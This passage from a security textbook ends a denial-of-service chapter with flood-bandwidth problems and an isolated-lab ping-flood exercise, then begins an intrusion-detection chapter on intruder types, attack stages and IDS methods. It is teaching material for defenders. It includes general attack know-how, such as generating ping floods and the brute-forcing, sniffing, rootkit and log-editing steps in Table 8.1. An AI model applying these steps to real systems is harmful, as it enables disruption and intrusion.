attacks? Can such attacks be \\r\\nentirely prevented?\\r\\n7.13 What is the purpose of SYN cookies?\\r\\n7.14 What defences are possible against a DNS amplification attack? Where must these be \\r\\nimplemented? Which are unique to this form of attack?\\r\\n7.15 What defenses are possible to prevent an organization’s systems being used as inter\\ufffemediaries in a broadcast amplification attack?\\r\\n7.16 To what do the terms slashdotted and flash crowd refer to? What is the relation between \\r\\nthese instances of legitimate network overload and the consequences of a DoS attack?\\r\\n7.17 What steps should be taken when a DoS attack is detected?\\r\\n7.18 What measures are needed to trace the source of various types of packets used in \\r\\na DoS attack? Are some types of packets easier to trace back to their source than \\r\\nothers?\\r\\nProblems\\r\\n7.1 In order to implement a classic DoS flood attack, the attacker must generate a suffi\\ufffeciently large volume of packets to exceed the capacity of the link to the target organi\\ufffezation. Consider an attack using ICMP echo request (ping) packets that are 100 bytes \\r\\nin size (ignoring framing overhead). How many of these packets per second must the \\r\\nattacker send to flood a target organization using a 8-Mbps link? How many per sec\\ufffeond if the packets are 1000 bytes in size? Or 1460 bytes?\\r\\n7.2 Using a TCP SYN spoofing attack, the attacker aims to flood the table of TCP con\\ufffenection requests on a system so that it is unable to respond to legitimate connection \\r\\nrequests. Consider a server system with a table for 256 connection requests. This sys\\ufffetem will retry sending the SYN-ACK packet five times when it fails to receive an ACK \\r\\npacket in response, at 30 second intervals, before purging the request from its table. \\r\\nAssume no additional countermeasures are used against this attack and the attacker \\r\\nhas filled this table with an initial flood of connection requests. At what rate must the \\r\\nattacker continue to send TCP connection requests to this system in order to ensure \\r\\nthat the table remains full? Assuming the TCP SYN packet is 40 bytes in size (ignoring \\r\\nframing overhead), how much bandwidth does the attacker consume to continue this \\r\\nattack?\\r\\n7.3 Consider a distributed variant of the attack we explore in Problem 7.1. Assume the \\r\\nattacker has compromised a number of broadband-connected residential PCs to use as \\r\\nzombie systems. Also assume each such system has an average uplink capacity of 256 kbps. \\r\\nWhat is the maximum number of 100-byte ICMP echo request packets a single zombie \\r\\nPC can send per second? If the packet size is 1000 bytes? Or 1500 bytes? How many such \\r\\nzombie systems would the attacker need to flood a target organization using a 8-Mbps \\r\\nlink? Given reports of botnets composed of many thousands of zombie systems, what can \\r\\nyou conclude about their controller’s ability to launch DDoS attacks on multiple such \\r\\norganizations simultaneously? Or on a major organization with multiple, much larger net\\ufffework links than we have considered in these problems?\\r\\n7.4 In order to implement a DNS amplification attack, the attacker must trigger the cre\\ufffeation of a sufficiently large volume of DNS response packets from the intermediary \\r\\nto exceed the capacity of the link to the target organization. Consider an attack where \\r\\nthe DNS response packets are 100 bytes in size (ignoring framing overhead). How \\r\\nmany of these packets per second must the attacker trigger to flood a target organiza\\ufffetion using an 8-Mbps link? If packet size is 1000 bytes? Or 1500 bytes? If the DNS \\r\\nM07_STAL0611_04_GE_C07.indd 271 10/11/17 2:54 PM\\n\\n\\n272 CHAPTER 7 / DENIAL-OF-SERVICE ATTACKS\\r\\nrequest packet to the intermediary is 70 bytes in size, how much bandwidth does the \\r\\nattacker consume out of the 8-Mbps link to send the necessary rate of DNS request \\r\\npackets?\\r\\n7.5 It is discussed that an amplification attack, which is a variant of reflection attack, can \\r\\nbe launched by using any type of a suitable UDP service, such as the echo service. \\r\\nHowever, TCP services cannot be used in this attack. Why?\\r\\n7.6 Research how to implement the defenses for the applications that are targeted (e.g., \\r\\nWeb server of your Organization) by the attacker.\\r\\n7.7 Assume a future where security countermeasures against DoS attacks are much more \\r\\nwidely implemented than at present. In this future network, antispoofing and directed \\r\\nbroadcast filters are widely deployed. In addition, the security of PCs and worksta\\ufffetions is much greater, making the creation of botnets difficult. Do the administrators \\r\\nof server systems still have to be concerned about, and take further countermeasures \\r\\nagainst, DoS attacks? If so, what types of attacks can still occur, and what measures \\r\\ncan be taken to reduce their impact?\\r\\n7.8 If you have access to a network lab with a dedicated, isolated test network, explore \\r\\nthe effect of high traffic volumes on its systems. Start any suitable Web server (e.g., \\r\\nApache, IIS, TinyWeb) on one of the lab systems. Note the IP address of this system. \\r\\nThen have several other systems query its server. Now, determine how to generate a \\r\\nflood of 1500-byte ping packets by exploring the options to the ping command. The \\r\\nflood option -f may be available if you have sufficient privilege. Otherwise determine \\r\\nhow to send an unlimited number of packets with a 0-second timeout. Run this ping \\r\\ncommand, directed at the Web server’s IP address, on several other attack systems. \\r\\nSee if it has any effect on the responsiveness of the server. Start more systems ping\\ufffeing the server. Eventually its response will slow and then fail. Note since the attack \\r\\nsources, query systems, and target are all on the same LAN, a very high rate of packets \\r\\nis needed to cause problems. If your network lab has suitable equipment to do so, \\r\\nexperiment with locating the attack and query systems on a different LAN to the tar\\ufffeget system, with a slower speed serial connection between them. In this case, far fewer \\r\\nattack systems should be needed. You can also explore application level DoS attacks \\r\\nusing SlowLoris and RUDY using the exercise presented in [DAMO12].\\r\\nM07_STAL0611_04_GE_C07.indd 272 10/11/17 2:54 PM\\n\\n\\n273\\r\\n8.1 Intruders\\r\\nIntruder Behavior\\r\\n8.2 Intrusion Detection\\r\\nBasic Principles\\r\\nThe Base-Rate Fallacy\\r\\nRequirements\\r\\n8.3 Analysis Approaches\\r\\nAnomaly Detection\\r\\nSignature or Heuristic Detection\\r\\n8.4 Host-Based Intrusion Detection\\r\\nData Sources and Sensors\\r\\nAnomaly HIDS\\r\\nSignature or Heuristic HIDS\\r\\nDistributed HIDS\\r\\n8.5 Network-Based Intrusion Detection\\r\\nTypes of Network Sensors\\r\\nNIDS Sensor Deployment\\r\\nIntrusion Detection Techniques\\r\\nLogging of Alerts\\r\\n8.6 Distributed or Hybrid Intrusion Detection\\r\\n8.7 Intrusion Detection Exchange Format\\r\\n8.8 Honeypots\\r\\n8.9 Example System: Snort\\r\\nSnort Architecture\\r\\nSnort Rules\\r\\n8.10 Key Terms, Review Questions, and Problems\\r\\nIntrusion Detection\\r\\nCHAPTER \\r\\nM08_STAL0611_04_GE_C08.indd 273 10/11/17 2:55 PM\\n\\n\\n274 CHAPTER 8 / INTRUSION DETECTION\\r\\nA significant security problem for networked systems is hostile, or at least \\r\\nunwanted, trespass by users or software. User trespass can take the form of unau\\ufffethorized logon or other access to a machine or, in the case of an authorized user, \\r\\nacquisition of privileges or performance of actions beyond those that have been\\r\\nauthorized. Software trespass includes a range of malware variants as we discuss \\r\\nin Chapter 6.\\r\\nThis chapter covers the subject of intrusions. First, we examine the nature \\r\\nof intruders and how they attack, then look at strategies for detecting intrusions.\\r\\n8.1 INTRUDERS\\r\\nOne of the key threats to security is the use of some form of hacking by an intruder, \\r\\noften referred to as a hacker or cracker. Verizon [VERI16] indicates that 92% of \\r\\nthe breaches they investigated were by outsiders, with 14% by insiders, and with \\r\\nsome breaches involving both outsiders and insiders. They also noted that insid\\ufffeers were responsible for a small number of very large dataset compromises. Both \\r\\nSymantec [SYMA16] and Verizon [VERI16] also comment that not only is there a \\r\\ngeneral increase in malicious hacking activity, but also an increase in attacks specifi\\ufffecally targeted at individuals in organizations and the IT systems they use. This trend \\r\\nemphasizes the need to use defense-in-depth strategies, since such targeted attacks \\r\\nmay be designed to bypass perimeter defenses such as firewalls and network-based \\r\\nIntrusion detection systems (IDSs).\\r\\nAs with any defense strategy, an understanding of possible motivations of the \\r\\nattackers can assist in designing a suitable defensive strategy. Again, both Symantec \\r\\n[SYMA16] and Verizon [VERI16] comment on the following broad classes of \\r\\nintruders:\\r\\n• Cyber criminals: Are either individuals or members of an organized crime group \\r\\nwith a goal of financial reward. To achieve this, their activities may include \\r\\nidentity theft, theft of financial credentials, corporate espionage, data theft, or \\r\\ndata ransoming. Typically, they are young, often Eastern European, Russian, or \\r\\nLEARNING OBJECTIVES\\r\\nAfter studying this chapter, you should be able to:\\r\\n◆ Distinguish among various types of intruder behavior patterns.\\r\\n◆ Understand the basic principles of and requirements for intrusion detection.\\r\\n◆ Discuss the key features of host-based intrusion detection.\\r\\n◆ Explain the concept of distributed host-based intrusion detection.\\r\\n◆ Discuss the key features of network-based intrusion detection.\\r\\n◆ Define the intrustion detection exchange format.\\r\\n◆ Explain the purpose of honeypots.\\r\\n◆ Present an overview of Snort.\\r\\nM08_STAL0611_04_GE_C08.indd 274 10/11/17 2:55 PM\\n\\n\\n8.1 / INTRUDERS 275\\r\\nsoutheast Asian hackers, who do business on the Web [ANTE06]. They meet \\r\\nin underground forums with names such as DarkMarket.org and theftservices.\\r\\ncom to trade tips and data and coordinate attacks. For some years, reports such \\r\\nas [SYMA16] have quoted very large and increasing costs resulting from cyber\\ufffecrime activities, and hence the need to take steps to mitigate this threat.\\r\\n• Activists: Are either individuals working as insiders, or members of a larger \\r\\ngroup of outsider attackers, who are motivated by social or political causes. \\r\\nThey are also known as hacktivists, and their skill level may be quite low. The \\r\\naim of their attacks is often to promote and publicize their cause, typically \\r\\nthrough website defacement, denial of service attacks, or the theft and distri\\ufffebution of data that results in negative publicity or compromise of their targets. \\r\\nWell-known recent examples include the activities of the groups Anonymous \\r\\nand LulzSec, and the actions of Chelsea (born Bradley) Manning and Edward \\r\\nSnowden.\\r\\n• State-sponsored organizations: Are groups of hackers sponsored by govern\\ufffements to conduct espionage or sabotage activities. They are also known as \\r\\nAdvanced Persistent Threats (APTs), due to the covert nature and persistence \\r\\nover extended periods involved with many attacks in this class. Recent reports \\r\\nsuch as [MAND13], and information revealed by Edward Snowden, indicate \\r\\nthe widespread nature and scope of these activities by a wide range of countries \\r\\nfrom China and Russia to the USA, UK, and their intelligence allies.\\r\\n• Others: Are hackers with motivations other than those listed above, including \\r\\nclassic hackers or crackers who are motivated by technical challenge or by peer\\ufffegroup esteem and reputation. Many of those responsible for discovering new \\r\\ncategories of buffer overflow vulnerabilities [MEER10] could be regarded as \\r\\nmembers of this class. In addition, given the wide availability of attack toolkits, \\r\\nthere is a pool of “hobby hackers” using them to explore system and network \\r\\nsecurity, who could potentially become recruits for the above classes.\\r\\nAcross these classes of intruders, there is also a range of skill levels seen. These \\r\\ncan be broadly classified as:\\r\\n• Apprentice: Hackers with minimal technical skill who primarily use existing \\r\\nattack toolkits. They likely comprise the largest number of attackers, including \\r\\nmany criminal and activist attackers. Given their use of existing known tools, \\r\\nthese attackers are the easiest to defend against. They are also known as “script\\ufffekiddies” due to their use of existing scripts (tools).\\r\\n• Journeyman: Hackers with sufficient technical skills to modify and extend \\r\\nattack toolkits to use newly discovered, or purchased, vulnerabilities; or to focus \\r\\non different target groups. They may also be able to locate new vulnerabilities \\r\\nto exploit that are similar to some already known. A number of hackers with \\r\\nsuch skills are likely found in all intruder classes listed above, adapting tools \\r\\nfor use by others. The changes in attack tools make identifying and defending \\r\\nagainst such attacks harder.\\r\\n• Master: Hackers with high-level technical skills capable of discovering brand \\r\\nnew categories of vulnerabilities, or writing new powerful attack toolkits. Some \\r\\nof the better-known classical hackers are of this level, as clearly are some of \\r\\nM08_STAL0611_04_GE_C08.indd 275 10/11/17 2:55 PM\\n\\n\\n276 CHAPTER 8 / INTRUSION DETECTION\\r\\nthose employed by some state-sponsored organizations, as the designation APT \\r\\nsuggests. This makes defending against these attackers of the highest difficulty.\\r\\nIntruder attacks range from the benign to the serious. At the benign end of the \\r\\nscale, there are people who simply wish to explore the Internet and see what is out \\r\\nthere. At the serious end are individuals or groups that attempt to read privileged \\r\\ndata, perform unauthorized modifications to data, or disrupt systems.\\r\\nNIST SP 800-61 (Computer Security Incident Handling Guide, August 2012) \\r\\nlists the following examples of intrusion:\\r\\n• Performing a remote root compromise of an e-mail server\\r\\n• Defacing a Web server\\r\\n• Guessing and cracking passwords\\r\\n• Copying a database containing credit card numbers\\r\\n• Viewing sensitive data, including payroll records and medical information, with\\ufffeout authorization\\r\\n• Running a packet sniffer on a workstation to capture usernames and passwords\\r\\n• Using a permission error on an anonymous FTP server to distribute pirated \\r\\nsoftware and music files\\r\\n• Dialing into an unsecured modem and gaining internal network access\\r\\n• Posing as an executive, calling the help desk, resetting the executive’s e-mail \\r\\npassword, and learning the new password\\r\\n• Using an unattended, logged-in workstation without permission\\r\\nIntrusion detection systems (IDSs) and intrusion prevention systems (IPSs), \\r\\nof the type described in this chapter and Chapter 9 respectively, are designed to aid \\r\\ncountering these types of threats. They can be reasonably effective against known, \\r\\nless sophisticated attacks, such as those by activist groups or large-scale e-mail scams. \\r\\nThey are likely less effective against the more sophisticated, targeted attacks by some \\r\\ncriminal or state-sponsored intruders, since these attackers are more likely to use new, \\r\\nzero-day exploits, and to better obscure their activities on the targeted system. Hence \\r\\nthey need to be part of a defense-in-depth strategy that may also include encryption \\r\\nof sensitive information, detailed audit trails, strong authentication and authoriza\\ufffetion controls, and active management of operating system and application security.\\r\\nIntruder Behavior\\r\\nThe techniques and behavior patterns of intruders are constantly shifting to exploit \\r\\nnewly discovered weaknesses and to evade detection and countermeasures. However, \\r\\nintruders typically use steps from a common attack methodology. [VERI16] in their \\r\\n“Wrap up” section illustrate a typical sequence of actions, starting with a phishing attack \\r\\nthat results in the installation of malware that steals login credentials that eventually \\r\\nresult in the compromise of a Point-of-Sale terminal. They note that while this is one spe\\ufffecific incident scenario, the components are commonly seen in many attacks. [MCCL12] \\r\\ndiscuss in detail a wider range of activities associated with the following steps:\\r\\n• Target Acquisition and Information Gathering: Where the attacker identifies \\r\\nand characterizes the target systems using publicly available information, both \\r\\nM08_STAL0611_04_GE_C08.indd 276 10/11/17 2:55 PM\\n\\n\\n8.1 / INTRUDERS 277\\r\\ntechnical and non technical, and the use of network exploration tools to map \\r\\ntarget resources.\\r\\n• Initial Access: The initial access to a target system, typically by exploiting a \\r\\nremote network vulnerability as we will discuss in Chapters 10 and 11, by guess\\ufffeing weak authentication credentials used in a remote service as we discussed in \\r\\nChapter 3, or via the installation of malware on the system using some form of \\r\\nsocial engineering or drive-by-download attack as we discussed in Chapter 6.\\r\\n• Privilege Escalation: Actions taken on the system, typically via a local access \\r\\nvulnerability as we will discuss in Chapters 10 and 11, to increase the privileges \\r\\navailable to the attacker to enable their desired goals on the target system.\\r\\n• Information Gathering or System Exploit: Actions by the attacker to access or mod\\ufffeify information or resources on the system, or to navigate to another target system.\\r\\n• Maintaining Access: Actions such as the installation of backdoors or other \\r\\nmalicious software as we discussed in Chapter 6, or through the addition of \\r\\ncovert authentication credentials or other configuration changes to the system, \\r\\nto enable continued access by the attacker after the initial attack.\\r\\n• Covering Tracks: Where the attacker disables or edits audit logs such as we will \\r\\ndiscuss in Chapter 18, to remove evidence of attack activity, and uses rootkits \\r\\nand other measures to hide covertly installed files or code as we discussed in \\r\\nChapter 6.\\r\\nTable 8.1 lists examples of activities associated with the above steps.\\r\\n(a) Target Acquisition and Information Gathering\\r\\n• Explore corporate website for information on corporate structure, personnel, key systems, as well as details \\r\\nof specific Web server and OS used.\\r\\n• Gather information on target network using DNS lookup tools such as dig, host, and others; and query \\r\\nWHOIS database.\\r\\n• Map network for accessible services using tools such as NMAP.\\r\\n• Send query e-mail to customer service contact, review response for information on mail client, server, and \\r\\nOS used, and also details of person responding.\\r\\n• Identify potentially vulnerable services, for example, vulnerable Web CMS.\\r\\n(b) Initial Access\\r\\n• Brute force (guess) a user’s Web content management system (CMS) password.\\r\\n• Exploit vulnerability in Web CMS plugin to gain system access.\\r\\n• Send spear-phishing e-mail with link to Web browser exploit to key people.\\r\\n(c) Privilege Escalation\\r\\n• Scan system for applications with local exploit.\\r\\n• Exploit any vulnerable application to gain elevated privileges.\\r\\n• Install sniffers to capture administrator passwords.\\r\\n• Use captured administrator password to access privileged information.\\r\\nTable 8.1 Examples of Intruder Behavior\\r\\n(Continued)\\r\\nM08_STAL0611_04_GE_C08.indd 277 10/11/17 2:55 PM\\n\\n\\n278 CHAPTER 8 / INTRUSION DETECTION\\r\\n8.2 INTRUSION DETECTION\\r\\nThe following terms are relevant to our discussion:\\r\\n(d) Information Gathering or System Exploit\\r\\n• Scan files for desired information.\\r\\n• Transfer large numbers of documents to external repository.\\r\\n• Use guessed or captured passwords to access other servers on network.\\r\\n(e) Maintaining Access\\r\\n• Install remote administration tool or rootkit with backdoor for later access.\\r\\n• Use administrator password to later access network.\\r\\n• Modify or disable anti-virus or IDS programs running on system.\\r\\n(f) Covering Tracks\\r\\n• Use rootkit to hide files installed on system.\\r\\n• Edit logfiles to remove entries generated during the intrusion.\\r\\nTable 8.1 (Continued)\\r\\nsecurity intrusion: Unauthorized act of bypassing the security mechanisms of a \\r\\nsystem.\\r\\nintrusion detection: A hardware or software function that gathers and analyzes \\r\\ninformation from various areas within a computer or a network to identify possible \\r\\nsecurity intrusions.\\r\\nAn IDS comprises three logical components:\\r\\n• Sensors: Sensors are responsible for collecting data. The input for a sensor may \\r\\nbe any part of a system that could contain evidence of an intrusion. Types of \\r\\ninput to a sensor includes network packets, log files, and system call traces. \\r\\nSensors collect and forward this information to the analyzer.\\r\\n• Analyzers:Analyzers receive input from one or more sensors or from other ana\\ufffelyzers. The analyzer is responsible for determining if an intrusion has occurred. \\r\\nThe output of this component is an indication that an intrusion has occurred. \\r\\nThe output may include evidence supporting the conclusion that an intrusion \\r\\noccurred. The analyzer may provide guidance about what actions to take as a \\r\\nresult of the intrusion. The sensor inputs may also be stored for future analysis \\r\\nand review in a storage or database component.\\r\\nM08_STAL0611_04_GE_C08.indd 278 10/11/17 2:55 PM\\n\\n\\n8.2 / INTRUSION DETECTION 279\\r\\n• User interface: The user interface to an IDS enables a user to view output from \\r\\nthe system or control the behavior of the system. In some systems, the user \\r\\ninterface may equate to a manager, director, or console component.\\r\\nAn IDS may use a single sensor and analyzer, such as a classic HIDS on a host \\r\\nor NIDS in a firewall device. More sophisticated IDSs can use multiple sensors, across \\r\\na range of host and network devices, sending information to a centralized analyzer \\r\\nand user interface in a distributed architecture.\\r\\nIDSs are often classified based on the source and type of data analyzed, as:\\r\\n• Host-based IDS (HIDS): Monitors the characteristics of a single host and the \\r\\nevents occurring within that host, such as process identifiers and the system calls \\r\\nthey make, for evidence of suspicious activity.\\r\\n• Network-based IDS (NIDS): Monitors network traffic for particular network \\r\\nsegments or devices and analyzes network, transport, and application protocols \\r\\nto identify suspicious activity.\\r\\n• Distributed or hybrid IDS: Combines information from a number of sensors, \\r\\noften both host and network-based, in a central analyzer that is able to better \\r\\nidentify and respond to intrusion activity.\\r\\nBasic Principles\\r\\nAuthentication facilities, access control facilities, and firewalls all play a role in coun\\ufffetering intrusions. Another line of defense is intrusion detection, and this has been \\r\\nthe focus of much research in recent years. This interest is motivated by a number of \\r\\nconsiderations, including the following:\\r\\n1. If an intrusion is detected quickly enough, the intruder can be identified and \\r\\nejected from the system before any damage is done or any data are compro\\ufffemised. Even if the detection is not sufficiently timely to preempt the intruder, \\r\\nthe sooner that the intrusion is detected, the less the amount of damage and \\r\\nthe more quickly that recovery can be achieved.\\r\\n2. An effective IDS can serve as a deterrent, thus acting to prevent intrusions.\\r\\n3. Intrusion detection enables the collection of information about intrusion tech\\ufffeniques that can be used to strengthen intrusion prevention measures.\\r\\nIntrusion detection is based on the assumption that the behavior of the intruder \\r\\ndiffers from that of a legitimate user in ways that can be quantified. Of course, we \\r\\ncannot expect that there will be a crisp, exact distinction between an attack by an \\r\\nintruder and the normal use of resources by an authorized user. Rather, we must \\r\\nexpect that there will be some overlap.\\r\\nFigure 8.1 suggests, in abstract terms, the nature of the task confronting the \\r\\ndesigner of an IDS. Although the typical behavior of an intruder differs from the typi\\ufffecal behavior of an authorized user, there is an overlap in these behaviors. Thus, a loose \\r\\ninterpretation of intruder behavior, which will catch more intruders, will also lead to \\r\\na number of false positives, or false alarms, where authorized users are identified as \\r\\nintruders. On the other hand, an attempt to limit false positives by a tight interpreta\\ufffetion of intruder behavior will lead to an increase in false negatives, or intruders not \\r\\nM08_STAL0611_04_GE_C08.indd 279 10/11/17 2:55 PM\\n\\n\\n280 CHAPTER 8 / INTRUSION DETECTION\\r\\nidentified as intruders. Thus, there is an element of compromise and art in the practice \\r\\nof intrusion detection. Ideally, you want an IDS to have a high detection rate, that is, \\r\\nthe ratio of detected to total attacks, while minimizing the false alarm rate, the ratio \\r\\nof incorrectly classified to total normal usage [LAZA05].\\r\\nIn an important early study of intrusion [ANDE80], Anderson postulated that \\r\\none could, with reasonable confidence, distinguish between an outside attacker and a \\r\\nlegitimate user. Patterns of legitimate user behavior can be established by observing \\r\\npast history, and significant deviation from such patterns can be detected. Anderson \\r\\nsuggests the task of detecting an inside attacker (a legitimate user acting in an unau\\ufffethorized fashion) is more difficult, in that the distinction between abnormal and \\r\\nnormal behavior may be small. Anderson concluded that such violations would be \\r\\nundetectable solely through the search for anomalous behavior. However, insider \\r\\nbehavior might nevertheless be detectable by intelligent definition of the class of \\r\\nconditions that suggest unauthorized use. These observations, which were made in \\r\\n1980, remain true today.\\r\\nThe Base-Rate Fallacy\\r\\nTo be of practical use, an IDS should detect a substantial percentage of intrusions \\r\\nwhile keeping the false alarm rate at an acceptable level. If only a modest percentage \\r\\nof actual intrusions are detected, the system provides a false sense of security. On \\r\\nthe other hand, if the system frequently triggers an alert when there is no intrusion \\r\\n(a false alarm), then either system managers will begin to ignore the alarms, or much \\r\\ntime will be wasted analyzing the false alarms.\\r\\nUnfortunately, because of the nature of the probabilities involved, it is very dif\\ufffeficult to meet the standard of high rate of detections with a low rate of false alarms. \\r\\nFigure 8.1 Profiles of Behavior of Intruders and Authorized Users\\r\\nOverlap in observed\\r\\nor expected behavior\\r\\nProfile of\\r\\nintruder behavior\\r\\nProfile of\\r\\nauthorized user\\r\\nbehavior\\r\\nMeasurable behavior\\r\\nparameter\\r\\nAverage behavior\\r\\nof intruder\\r\\nAverage behavior\\r\\nof authorized user\\r\\nProbability\\r\\ndensity function\\r\\nM08_STAL0611_04_GE_C08.indd 280 10/11/17 2:55 PM\\n\\n\\n8.3 / ANALYSIS APPROACHES 281\\r\\nIn general, if the actual numbers of intrusions is low compared to the number of \\r\\nlegitimate uses of a system, then the false alarm rate will be high unless the test is \\r\\nextremely discriminating. This is an example of a phenomenon known as the base\\uffferate fallacy. A study of existing IDSs, reported in [AXEL00], indicated that current \\r\\nsystems have not overcome the problem of the base-rate fallacy. See Appendix I for \\r\\na brief background on the mathematics of this problem.\\r\\nRequirements\\r\\n[BALA98] lists the following as desirable for an IDS. It must:\\r\\n• Run continually with minimal human supervision.\\r\\n• Be fault tolerant in the sense that it must be able to recover from system crashes \\r\\nand reinitializations.\\r\\n• Resist subversion. The IDS must be able to monitor itself and detect if it has \\r\\nbeen modified by an attacker.\\r\\n• Impose a minimal overhead on the system where it is running.\\r\\n• Be able to be configured according to the security policies of the system that \\r\\nis being monitored.\\r\\n• Be able to adapt to changes in system and user behavior over time.\\r\\n• Be able to scale to monitor a large number of hosts.\\r\\n• Provide graceful degradation of service in the sense that if some components \\r\\nof the IDS stop working for any reason, the rest of them should be affected as \\r\\nlittle as possible.\\r\\n• Allow dynamic reconfiguration; that is, the ability to reconfigure the IDS with\\ufffeout having to restart it.\\r\\n8.3 ANALYSIS APPROACHES\\r\\nIDSs typically use one of the following alternative approaches to analyze sensor data \\r\\nto detect intrusions:\\r\\n1. Anomaly detection: Involves the collection of data relating to the behavior \\r\\nof legitimate users over a period of time. Then, current observed behavior is \\r\\nanalyzed to determine with a high level of confidence whether this behavior is \\r\\nthat of a legitimate user or alternatively that of an intruder.\\r\\n2. Signature or Heuristic detection: Uses a set of known malicious data patterns \\r\\n(signatures) or attack rules (heuristics) that are compared with current behavior \\r\\nto decide if it is that of an intruder. It is also known as misuse detection. This \\r\\napproach can only identify known attacks for which it has patterns or rules.\\r\\nIn essence, anomaly approaches aim to define normal, or expected, behavior, in \\r\\norder to identify malicious or unauthorized behavior. Signature or heuristic-based \\r\\napproaches directly define malicious or unauthorized behavior. They can quickly and \\r\\nefficiently identify known attacks. However, only anomaly detection is able to detect \\r\\nunknown, zero-day attacks, as it starts with known good behavior and identifies \\r\\nM08_STAL0611_04_GE_C08.indd 281 10/11/17 2:55 PM\\n\\n\\n282 CHAPTER 8 / INTRUSION DETECTION\\r\\nanomalies to it. Given this advantage, clearly anomaly detection would be the pre\\ufffeferred approach, were it not for the difficulty in collecting and analyzing the data \\r\\nrequired, and the high level of false alarms, as we will discuss in the following sections.\\r\\nAnomaly Detection\\r\\nThe anomaly detection approach involves first developing a model of legitimate user \\r\\nbehavior by collecting and processing sensor data from the normal operation of the \\r\\nmonitored system in a training phase. This may occur at distinct times, or there may \\r\\nbe a continuous process of monitoring and evolving the model over time. Once this \\r\\nmodel exists, current observed behavior is compared with the model in order to clas\\ufffesify it as either legitimate or anomalous activity in a detection phase.\\r\\nA variety of classification approaches are used, which [GARC09] broadly \\r\\ncategorized as:\\r\\n• Statistical: Analysis of the observed behavior using univariate, multivariate, or \\r\\ntime-series models of observed metrics.\\r\\n• Knowledge based: Approaches use an expert system that classifies observed \\r\\nbehavior according to a set of rules that model legitimate behavior.\\r\\n• Machine-learning: Approaches automatically determine a suitable classification \\r\\nmodel from the training data using data mining techniques.\\r\\nThey also note two key issues that affect the relative performance of these alterna\\ufffetives, being the efficiency and cost of the detection process.\\r\\nThe monitored data is first parameterized into desired standard metrics that \\r\\nwill then be analyzed. This step ensures that data gathered from a variety of possible \\r\\nsources is provided in standard form for analysis.\\r\\nStatistical approaches use the captured sensor data to develop a statistical pro\\ufffefile of the observed metrics. The earliest approaches used univariate models, where \\r\\neach metric was treated as an independent random variable. However, this was too \\r\\ncrude to effectively identify intruder behavior. Later, multivariate models consid\\ufffeered correlations between the metrics, with better levels of discrimination observed. \\r\\nTime-series models use the order and time between observed events to better classify \\r\\nthe behavior. The advantages of these statistical approaches include theirrelative sim\\ufffeplicity and low computation cost, and lack of assumptions about behavior expected. \\r\\nTheir disadvantages include the difficulty in selecting suitable metrics to obtain a rea\\ufffesonable balance between false positives and false negatives, and that not all behaviors \\r\\ncan be modeled using these approaches.\\r\\nKnowledge-based approaches classify the observed data using a set of rules. \\r\\nThese rules are developed during the training phase, usually manually, to characterize \\r\\nthe observed training data into distinct classes. Formal tools may be used to describe \\r\\nthese rules, such as a finite-state machine or a standard description language. They \\r\\nare then used to classify the observed data in the detection phase. The advantages \\r\\nof knowledge-based approaches include their robustness and flexibility. Their main \\r\\ndisadvantage is the difficulty and time required to develop high-quality knowledge \\r\\nfrom the data, and the need for human experts to assist with this process.\\r\\nMachine-learning approaches use data mining techniques to automatically \\r\\ndevelop a model using the labeled normal training data. This model is then able \\r\\nM08_STAL0611_04_GE_C08.indd 282 10/11/17 2:55 PM\\n\\n\\n8.3 / ANALYSIS APPROACHES 283\\r\\nto classify subsequently observed data as either normal or anomalous. A key dis\\ufffeadvantage is that this process typically requires significant time and computational \\r\\nresources. Once the model is generated however, subsequent analysis is generally \\r\\nfairly efficient.\\r\\nA variety of machine-learning approaches have been tried, with varying success. \\r\\nThese include:\\r\\n• Bayesian networks: Encode probabilistic relationships among observed metrics.\\r\\n• Markov models: Develop a model with sets of states, some possibly hidden, \\r\\ninterconnected by transition probabilities.\\r\\n• Neural networks: Simulate human brain operation with neurons and synapse \\r\\nbetween them, that classify observed data.\\r\\n• Fuzzy logic: Uses fuzzy set theory where reasoning is approximate, and can \\r\\naccommodate uncertainty.\\r\\n• Genetic algorithms: Uses techniques inspired by evolutionary biology, including \\r\\ninheritance, mutation, selection and recombination, to develop classification \\r\\nrules.\\r\\n• Clustering and outlier detection: Group the observed data into clusters based \\r\\non some similarity or distance measure, and then identify subsequent data as \\r\\neither belonging to a cluster or as an outlier.\\r\\nThe advantages of the machine-learning approaches include their flexibility, adapt\\ufffeability, and ability to capture interdependencies between the observed metrics. Their \\r\\ndisadvantages include their dependency on assumptions about accepted behavior for a \\r\\nsystem, their currently unacceptably high false alarm rate, and their high resource cost.\\r\\nA key limitation of anomaly detection approaches used by IDSs, particularly \\r\\nthe machine-learning approaches, is that they are generally only trained with legiti\\ufffemate data, unlike many of the other applications surveyed in [CHAN09] where both \\r\\nlegitimate and anomalous training data is used. The lack of anomalous training data, \\r\\nwhich occurs given the desire to detect currently unknown future attacks, limits the \\r\\neffectiveness of some of the techniques listed above.\\r\\nSignature or Heuristic Detection\\r\\nSignature or heuristic techniques detect intrusion by observing events in the system \\r\\nand applying either a set of signature patterns to the data, or a set of rules that char\\ufffeacterize the data, leading to a decision regarding whether the observed data indicates \\r\\nnormal or anomalous behavior.\\r\\nSignature approaches match a large collection of known patterns of malicious \\r\\ndata against data stored on a system or in transit over a network. The signatures need \\r\\nto be large enough to minimize the false alarm rate, while still detecting a sufficiently \\r\\nlarge fraction of malicious data. This approach is widely used in anti virus products, \\r\\nin network traffic scanning proxies, and in NIDS. The advantages of this approach \\r\\ninclude the relatively low cost in time and resource use, and its wide acceptance. Dis\\ufffeadvantages include the significant effort required to constantly identify and review \\r\\nnew malware to create signatures able to identify it, and the inability to detect zero\\ufffeday attacks for which no signatures exist.\\r\\nM08_STAL0611_04_GE_C08.indd 283 10/11/17 2:55 PM\\n\\n\\n284 CHAPTER 8 / INTRUSION DETECTION\\r\\nRule-based heuristic identification involves the use of rules for identifying \\r\\nknown penetrations or penetrations that would exploit known weaknesses. Rules can \\r\\nalso be defined that identify suspicious behavior, even when the behavior is within the \\r\\nbounds of established patterns of usage. Typically, the rules used in these systems are \\r\\nspecific to the machine and operating system. The most fruitful approach to develop\\ufffeing such rules is to analyze attack tools and scripts collected on the Internet. These \\r\\nrules can be supplemented with rules generated by knowledgeable security person\\ufffenel. In this latter case, the normal procedure is to interview system administrators \\r\\nand security analysts to collect a suite of known penetration scenarios and key events \\r\\nthat threaten the security of the target system.\\r\\nThe SNORT system, which we will discuss later in Section 8.9, is an example \\r\\nof a rule-based NIDS. A large collection of rules exists for it to detect a wide variety \\r\\nof network attacks.\\r\\n8.4 HOST-BASED INTRUSION DETECTION\\r\\nHost-based IDSs (HIDSs) add a specialized layer of security software to 